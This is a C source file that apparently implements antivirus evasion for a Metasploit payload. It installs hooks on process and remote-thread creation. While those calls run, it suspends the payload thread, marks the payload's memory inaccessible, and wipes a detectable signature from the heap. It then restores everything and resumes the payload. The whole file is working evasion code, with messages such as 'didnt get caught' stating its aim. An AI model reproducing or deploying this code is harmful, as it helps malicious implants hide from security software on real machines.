#include "customhooks.h"


BOOL 
WINAPI
hookCreateProcessInternalW(HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken)
{
	BOOL res = FALSE;
	restoreHook(createProcessHookResult);
	createProcessHookResult = NULL;

	printf("My createProcess called\n");

	LPVOID options = makeProcessOptions(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);

	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)createProcessNinja, options, 0, NULL);

	printf("[!] Waiting for thread to finish\n");
	WaitForSingleObject(thread, INFINITE);

	GetExitCodeThread(thread, (LPDWORD)& res);

	printf("[!] Thread finished\n");

	CloseHandle(thread);

	createProcessHookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);

	return res;
}

BOOL createProcessNinja(LPVOID options) {
	LPPROCESS_OPTIONS processOptions = (LPPROCESS_OPTIONS)options;

	printf("Thread Handle: %02lX\n", metasploitThread);

	
	if (SuspendThread(metasploitThread) != -1) {
		printf("[!] Suspended thread \n");
	}
	else {
		printf("Couldnt suspend thread: %d\n", GetLastError());
	}


	setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);
	
	BOOL res = CreateProcessInternalW(processOptions->hToken,
		processOptions->lpApplicationName,
		processOptions->lpCommandLine,
		processOptions->lpProcessAttributes,
		processOptions->lpThreadAttributes,
		processOptions->bInheritHandles,
		processOptions->dwCreationFlags,
		processOptions->lpEnvironment,
		processOptions->lpCurrentDirectory,
		processOptions->lpStartupInfo,
		processOptions->lpProcessInformation,
		processOptions->hNewToken);

	Sleep(7000);

	if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
		printf("ALL OK, resuming thread\n");

		ResumeThread(metasploitThread);
	}
	else {
		printf("[X] Coundn't revert permissions back to normal\n");
	}

	HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, processOptions);
	return res;
}


NTSTATUS 
NTAPI 
hookCreateRemoteThreadEx(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList)
{
	printf("UPDATED VERSION\n");
	restoreHook(createRemoteThreadHookResult);
	createRemoteThreadHookResult = NULL;

	printf("My createRemoteThread called\n");
	printf("Process Handle %02uX\n", GetProcessId(ProcessHandle));
	printf("Current Process Handle %02uX\n", GetCurrentProcessId());

	NTSTATUS res = 0;

	if (GetProcessId(ProcessHandle) != GetCurrentProcessId()) {
		LPVOID options = makeThreadOptions(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
		HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)createRemoteThreadNinja, options, 0, NULL);

		printf("[!] Waiting for thread to finish\n");
		WaitForSingleObject(thread, INFINITE);
		GetExitCodeThread(thread, (LPDWORD)& res);
		printf("[!] Thread finished\n");

		CloseHandle(thread);
	}
	else {
		res = NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
	}

	createRemoteThreadHookResult = installHook(NtCreateThreadEx, hookCreateRemoteThreadEx, 5);
	printf("[!] Result is: %02lX\n", res);
	return res;
}

/*
NTSTATUS hookCreateRemoteThreadEx2(LPVOID options) {


	printf("Here I am!!\n");
	LPTHREAD_OPTIONS threadOptions = (LPTHREAD_OPTIONS)options;

	if (SuspendThread(metasploitThread) != -1) {
		printf("[!] Suspended thread \n");
	}
	else {
		printf("Couldnt suspend thread: %d\n", GetLastError());
	}


	SIGNATURE sig;
	sig.signature = (LPBYTE)detectableSignature;
	sig.sigSize = 20;

	PROCESS_HEAP_ENTRY heapEntry;

	SecureZeroMemory(&heapEntry, sizeof(PROCESS_HEAP_ENTRY));

	HANDLE heap = GetProcessHeap();

	PATTERN_RESULT patternRes = { 0 };
	patternRes.sigs = malloc(sizeof(SIZE_T) * 10);

	DWORD oldDummy;
	
	VirtualProtect(detectableSignature, 20, PAGE_READWRITE, &oldDummy);

	printf("first sig byte: %X\n", detectableSignature[0]);
	printf("UPDATED V1.0\n");

	heapEntry.lpData = NULL;
	HeapLock(heap);
	while (HeapWalk(heap, &heapEntry)) {
		if ((heapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) && heapEntry.cbData > 0) {
			patternScanEx((SIZE_T)heapEntry.lpData, heapEntry.cbData, "xxxxxxxxxxxxxxxxxxxx", &sig, &patternRes, 10);
			if (patternRes.size > 0) {
				SecureZeroMemory(heapEntry.lpData, heapEntry.cbData);
				printf("Flags of heap entry: %X, index: %X\n", heapEntry.wFlags, heapEntry.iRegionIndex);
			}
		}
	}	
	HeapUnlock(heap);
	printf("Heap walk finished with: %X\n", GetLastError());



	printf("Cleaned haep\n");
	printf("first sig byte: %X\n", detectableSignature[0]);
	setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);

	searchWholeThing(&sig);

	if (!VirtualProtect(detectableSignature, 0x1000, PAGE_NOACCESS, &oldDummy)) {
		printf("[HEEEREEEEE] Couldn't hide signature\n");
	}

	
	HANDLE elevatedHandle = NULL;

	if (!DuplicateHandle(GetCurrentProcess(), threadOptions->ProcessHandle, GetCurrentProcess(), &elevatedHandle, PROCESS_ALL_ACCESS, FALSE, NULL)) {
		printf("[FAILED] Couldn't duplicate HANDLE, %d", GetLastError());
	}

	MEMORY_BASIC_INFORMATION info = { 0 };

	if (!VirtualQueryEx(threadOptions->ProcessHandle, threadOptions->StartRoutine, &info, sizeof(MEMORY_BASIC_INFORMATION))) {

		printf("VirtualQueryEx FAILED \n");
	}


	printf("BaseAddress -> %02X\n", (DWORD)info.BaseAddress);
	printf("AllocationBase -> %02X\n", (DWORD)info.AllocationBase);
	printf("AllocationProtect -> %02X\n", (DWORD)info.AllocationProtect);
	printf("RegionSize -> %02X\n", (DWORD)info.RegionSize);
	printf("State -> %02X\n", (DWORD)info.State);
	printf("Protect -> %02X\n", (DWORD)info.Protect);
	printf("Type -> %02X\n", (DWORD)info.Type);

	DWORD bytesRead;
	DWORD bytesWrote;

	DWORD dummy2;

	if (!VirtualProtectEx(elevatedHandle, info.AllocationBase, info.RegionSize, PAGE_NOACCESS, &dummy2)) {
		printf("[HEEEREEEEE] Couldn't hide signature\n");
		printf("Couldn't change permissions of target process, %d\n", GetLastError());
	}

	printf("Before NtCreateThreadEx\n");

	NTSTATUS res = NtCreateThreadEx(threadOptions->ThreadHandle,
		threadOptions->DesiredAccess,
		threadOptions->ObjectAttributes,
		threadOptions->ProcessHandle,
		threadOptions->StartRoutine,
		threadOptions->Argument,
		threadOptions->CreateFlags | CREATE_SUSPENDED,
		threadOptions->ZeroBits,
		threadOptions->StackSize,
		threadOptions->MaximumStackSize,
		threadOptions->AttributeList);

	printf("[!] Made a call to NtCreateThreadEx, sleeping for another 5 sec\n");

	Sleep(8000);

	DWORD dummy3;

	if (!VirtualProtectEx(elevatedHandle, info.AllocationBase, info.RegionSize, dummy2, &dummy3)) {
		printf("Couldn't change permissions of target process, %d\n", GetLastError());
	}

	if (!(threadOptions->CreateFlags & CREATE_SUSPENDED)) {
		printf("Resuming remote thread!!\n");
		ResumeThread(threadOptions->ThreadHandle);
	}

	printf("OK didnt get caught exiting\n");

	if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
		printf("ALL OK, resuming thread\n");

		if (ResumeThread(metasploitThread) != -1) {
			printf("[!] Thread resumed\n");
		}
		else {
			printf("[!] Thread couldn't resume %d\n", GetLastError());
		}
	}

	HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, threadOptions);

	if (elevatedHandle != NULL) {
		CloseHandle(elevatedHandle);
	}

	return res;
}*/


NTSTATUS createRemoteThreadNinja(LPVOID options) {
	LPTHREAD_OPTIONS threadOptions = (LPTHREAD_OPTIONS)options;

	printf("Thread Handle: %02lX\n", metasploitThread);
	// printf("Here I am!!\n");


	if (SuspendThread(metasploitThread) != -1) {
		printf("[!] Suspended thread \n");
	}
	else {
		printf("Couldnt suspend thread: %d\n", GetLastError());
	}

	DWORD oldDummy;

	VirtualProtect(detectableSignature, 0x1000, PAGE_READWRITE, &oldDummy);

	SIGNATURE sig;
	sig.signature = (LPBYTE)detectableSignature;
	sig.sigSize = 20;


	
	PATTERN_RESULT patternRes = { 0 };
	patternRes.sigs = malloc(sizeof(SIZE_T) * 10);

	PHANDLE heapBuff = malloc(sizeof(HANDLE) * 10);

	DWORD heapNum = GetProcessHeaps(10, heapBuff);
	
	for (DWORD heapIndex = 0;  heapIndex < heapNum; heapIndex++) {
		printf("Iterating %d, heap\n", heapIndex);
		HANDLE heap = heapBuff[heapIndex];
		
		// HeapLock(heap);

		PROCESS_HEAP_ENTRY heapEntry;

		SecureZeroMemory(&heapEntry, sizeof(PROCESS_HEAP_ENTRY));

		heapEntry.lpData = NULL;

		while (HeapWalk(heap, &heapEntry)) {
			if ((heapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) && heapEntry.cbData > 0) {
				patternScanEx((SIZE_T)heapEntry.lpData, heapEntry.cbData, "xxxxxxxxxxxxxxxxxxxx", &sig, &patternRes, 10);
				if (patternRes.size > 0) {
					SecureZeroMemory(heapEntry.lpData, heapEntry.cbData);
					printf("Flags of heap entry: %X, index: %X\n", heapEntry.wFlags, heapEntry.iRegionIndex);
				}
			}
		}
		
		// HeapUnlock(heap);
	}

	free(heapBuff);

	setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);

	searchWholeThing(&sig);

	if (!VirtualProtect(detectableSignature, 0x1000, PAGE_NOACCESS, &oldDummy)) {
		printf("[X] virtual protected sig failed %d\n", GetLastError());
	}

	printMemoryInfo(detectableSignature);

	// ARRAY heapArr = { 0 };

	// cleanHeap(&heapArr);



	// printf("Cleaned the heap\n");

	HANDLE elevatedHandle = NULL;

	if (!DuplicateHandle(GetCurrentProcess(), threadOptions->ProcessHandle, GetCurrentProcess(), &elevatedHandle, PROCESS_ALL_ACCESS, FALSE, 0)) {
		printf("[FAILED] Couldn't duplicate HANDLE, %d", GetLastError());
	}

	MEMORY_BASIC_INFORMATION info = { 0 };


	if (!VirtualQueryEx(elevatedHandle, threadOptions->StartRoutine, &info, sizeof(MEMORY_BASIC_INFORMATION))) {
		printf("VirtualQueryEx FAILED \n");
	}

	printf("BaseAddress -> %02X\n", (DWORD)info.BaseAddress);
	printf("AllocationBase -> %02X\n", (DWORD)info.AllocationBase);
	printf("AllocationProtect -> %02X\n", (DWORD)info.AllocationProtect);
	printf("RegionSize -> %02X\n", (DWORD)info.RegionSize);
	printf("State -> %02X\n", (DWORD)info.State);
	printf("Protect -> %02X\n", (DWORD)info.Protect);
	printf("Type -> %02X\n", (DWORD)info.Type);

	BOOL memPrivate = info.Type == MEM_PRIVATE;

	DWORD oldProtect, dummy;

	LPVOID buffer = calloc(1, info.RegionSize);

	LPVOID copyBuff = VirtualAlloc(NULL, info.RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	DWORD bytesWritten;
	DWORD bytesRead;


	if (memPrivate) {
		printf("MEM_PRIVATE found!\n");
		/*
		if (!VirtualProtectEx(elevatedHandle, (LPVOID)info.AllocationBase, info.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
			printf("First protect failed %d\n", GetLastError());
		}
		else {
			printf("First protect succed\n");
		}
		
		if (!ReadProcessMemory(elevatedHandle, (LPVOID)info.AllocationBase, copyBuff, info.RegionSize, &bytesRead) || bytesRead != info.RegionSize) {
			printf("ReadProcessMemory failed %d\n", GetLastError());
		}
		else {
			printf("ReadProcess success\n");
		}

		if (!WriteProcessMemory(elevatedHandle, (LPVOID)info.AllocationBase, buffer, info.RegionSize, &bytesWritten) || bytesWritten != bytesRead) { // write 0's
			printf("Write Proceess failed, %d\n", GetLastError());
			printf("bytes read: 0x%X, bytes written: 0x%X\n", bytesRead, bytesWritten);
		}
		else {
			printf("Write process succeed, wrote: 0x%X bytes\n", bytesWritten);
		}


		if (!VirtualProtectEx(elevatedHandle, info.AllocationBase, info.RegionSize, oldProtect, &dummy)) {
			printf("second protect failed %d\n", GetLastError());
		}
		else {
			printf("second protect succedd\n");
		}

		if (!VirtualProtect(copyBuff, info.RegionSize, PAGE_NOACCESS, &dummy)) {
			printf("Third protect failed %d\n", GetLastError());
		}
		else {
			printf("PAGE_NOACESS on copybuff!\n");

			MEMORY_BASIC_INFORMATION info2 = { 0 };

			if (!VirtualQuery(copyBuff, &info2, sizeof(MEMORY_BASIC_INFORMATION))) {
				printf("VirtualQueryEx FAILED \n");
			}

			printf("BaseAddress -> %02X\n", (DWORD)info2.BaseAddress);
			printf("AllocationBase -> %02X\n", (DWORD)info2.AllocationBase);
			printf("AllocationProtect -> %02X\n", (DWORD)info2.AllocationProtect);
			printf("RegionSize -> %02X\n", (DWORD)info2.RegionSize);
			printf("State -> %02X\n", (DWORD)info2.State);
			printf("Protect -> %02X\n", (DWORD)info2.Protect);
			printf("Type -> %02X\n", (DWORD)info2.Type);
		}*/
		if (!VirtualProtectEx(elevatedHandle, (LPVOID)info.AllocationBase, info.RegionSize, PAGE_NOACCESS, &oldProtect)) {
			printf("First protect failed %d\n", GetLastError());
		}
	}

	free(buffer);

	printf("Before NtCreateThreadEx\n");

	Sleep(3000);

	NTSTATUS res = NtCreateThreadEx(threadOptions->ThreadHandle,
		threadOptions->DesiredAccess,
		threadOptions->ObjectAttributes,
		threadOptions->ProcessHandle,
		threadOptions->StartRoutine,
		threadOptions->Argument,
		threadOptions->CreateFlags | CREATE_SUSPENDED,
		threadOptions->ZeroBits,
		threadOptions->StackSize,
		threadOptions->MaximumStackSize,
		threadOptions->AttributeList);

	printf("Made call to NtCreateThreadEx\n");

	Sleep(4000);

	printf("Restoring remote thread!\n");

	if (memPrivate) {
		/*
		if (!VirtualProtect(copyBuff, info.RegionSize, PAGE_READWRITE, &dummy)) {
			printf("Restore first protect failed %d\n", GetLastError());
		}

		DWORD bytesWritten2;
		
		if (!WriteProcessMemory(elevatedHandle, info.AllocationBase, copyBuff, info.RegionSize, &bytesWritten2) || bytesWritten2 != info.RegionSize) {
			printf("Restore first write process memory failed: %d\n", GetLastError());
		}

		ZeroMemory(copyBuff, info.RegionSize);
		if (!VirtualProtect(copyBuff, info.RegionSize, PAGE_NOACCESS, &dummy)) {
			printf("Restore second protect failed %d\n", GetLastError());
		}*/
		if (!VirtualProtectEx(elevatedHandle, (LPVOID)info.AllocationBase, info.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
			printf("First protect failed %d\n", GetLastError());
		}
		printf("OK restored mem\n");
	}

	VirtualFree(copyBuff, info.RegionSize, MEM_RELEASE);

	if (!(threadOptions->CreateFlags & CREATE_SUSPENDED)) {
		printf("Resuming remote thread!!\n");
		ResumeThread(threadOptions->ThreadHandle);
	}

	// restoreHeap(&heapArr);

	if (elevatedHandle != NULL) {
		CloseHandle(elevatedHandle);
	}

	if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
		printf("ALL OK, resuming thread\n");

		if (ResumeThread(metasploitThread) != -1) {
			printf("[!] Thread resumed\n");
		}
		else {
			printf("[!] Thread couldn't resume %d\n", GetLastError());
		}
	}
	else {
		printf("[X] Coundn't revert permissions back to normal\n");
	}

	HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, threadOptions);

	return res;
}


LPPROCESS_OPTIONS makeProcessOptions(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken
	) 
{
	LPPROCESS_OPTIONS options = (LPPROCESS_OPTIONS)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(PROCESS_OPTIONS));

	options->hToken = hToken;
	options->lpApplicationName = lpApplicationName;
	options->lpCommandLine = lpCommandLine;
	options->lpProcessAttributes = lpProcessAttributes;
	options->lpThreadAttributes = lpThreadAttributes;
	options->bInheritHandles = bInheritHandles;
	options->dwCreationFlags = dwCreationFlags;
	options->lpEnvironment = lpEnvironment;
	options->lpCurrentDirectory = lpCurrentDirectory;
	options->lpStartupInfo = lpStartupInfo;
	options->lpProcessInformation = lpProcessInformation;
	options->hNewToken = hNewToken;

	return options;
}


LPTHREAD_OPTIONS makeThreadOptions(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
	) 
{
	LPTHREAD_OPTIONS options = (LPTHREAD_OPTIONS)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(THREAD_OPTIONS));

	options->ThreadHandle = ThreadHandle;
	options->DesiredAccess = DesiredAccess;
	options->ObjectAttributes = ObjectAttributes;
	options->ProcessHandle = ProcessHandle;
	options->StartRoutine = StartRoutine;
	options->Argument = Argument;
	options->CreateFlags = CreateFlags;
	options->ZeroBits = ZeroBits;
	options->StackSize = StackSize;
	options->MaximumStackSize = MaximumStackSize;
	options->AttributeList = AttributeList;
	return options;
}